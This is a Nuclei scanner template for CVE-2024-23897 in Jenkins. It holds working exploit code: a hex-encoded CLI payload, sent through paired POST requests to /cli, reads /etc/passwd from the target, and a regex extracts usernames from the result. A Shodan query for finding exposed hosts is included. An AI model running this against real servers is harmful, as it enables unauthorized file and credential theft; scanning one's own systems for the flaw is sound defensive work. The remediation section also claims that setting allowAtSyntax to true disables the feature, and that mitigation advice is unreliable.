id: CVE-2024-23897

info:
  name: Jenkins < 2.441 - Arbitrary File Read
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable a feature of its CLI command parser that replaces an '@' character followed by a file path in an argument with the file's contents, allowing unauthenticated attackers to read arbitrary files on the Jenkins controller file system.
  reference:
    - https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
    - https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/
    - https://github.com/Mr-xn/Penetration_Testing_POC
    - https://github.com/forsaken0127/CVE-2024-23897
    - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: |
    1. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。
    【备注】：建议您在升级前做好数据备份工作，避免出现意外。
    https://www.jenkins.io/download/
    2. 临时缓解方案：
      如果不需要使用Jenkins CLI，可以在Jenkins配置中通过设置Java系统属性 hudson.cli.CLICommand.allowAtSyntax为true来禁用CLI功能(不推荐)；如果需要使用CLI请设置ACL策略限制对CLI的访问权限,并仅授权给受信任的用户。
      按照最小权限原则，为用户和插件分配适当的权限级别，仅提供其所需的操作和功能。
      配置Jenkins的安全设置，包括启用CSRF保护、禁用不必要的功能和插件、限制对重要文件和密钥的访问等。
      妥善管理和保护Jenkins中使用的密钥，包括限制对密钥文件的访问权限、定期更换密钥、使用安全的密钥存储等。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-23897
    epss-score: 0.41536
    epss-percentile: 0.97188
    cpe: cpe:2.3:a:jenkins:jenkins:*:*:*:*:lts:*:*:*
  metadata:
    date: 2024-01-24
    version: |
      Jenkins <= 2.441
      Jenkins LTS <= 2.426.2
    verified: true
    max-request: 1
    vendor: jenkins
    product: jenkins
    shodan-query: "product:\"Jenkins\""
  tags: cve,cve2024,lfi,rce,jenkins
variables:
  payload: "{{hex_decode('0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f706173737764000000070200055554462d3800000007010005656e5f41450000000003')}}"

javascript:
  - code: |
      let m = require('nuclei/net');
      let name=(Host.includes(':') ? Host : Host+":80");
      let conn,conn2;
      try { conn = m.OpenTLS('tcp', name) } catch { conn=  m.Open('tcp', name)}
      conn.Send('POST /cli?remoting=false HTTP/1.1\r\nHost:'+Host+'\r\nSession: 39382176-ac9c-4a00-bbc6-4172b3cf1e92\r\nSide: download\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n');
      try { conn2 = m.OpenTLS('tcp', name) } catch { conn2=  m.Open('tcp', name)}
      conn2.Send('POST /cli?remoting=false HTTP/1.1\r\nHost:'+Host+'\r\nContent-type: application/octet-stream\r\nSession: 39382176-ac9c-4a00-bbc6-4172b3cf1e92\r\nSide: upload\r\nConnection: keep-alive\r\nContent-Length: 163\r\n\r\n'+Body)
      resp = conn.RecvString(1000)
    args:
      Body: "{{payload}}"
      Host: "{{Hostname}}"

    matchers:
      - type: dsl
        dsl:
          - 'contains(response, "No such agent \"")'

    extractors:
      - type: regex
        group: 1
        regex:
          - '\b([a-z_][a-z0-9_-]{0,31})\:x\:'
# digest: 4b0a00483046022100a22e0bf486c5362bd7b22a4d814691dcb9318a631e13e7cf7086dd922feb4dd4022100cfacc9f72ee0cf45347e0c8c97dc2b5c6f95028b6f5cc3a68a506f4d3d4c7964:922c64590222798bb761d5b6d8e72950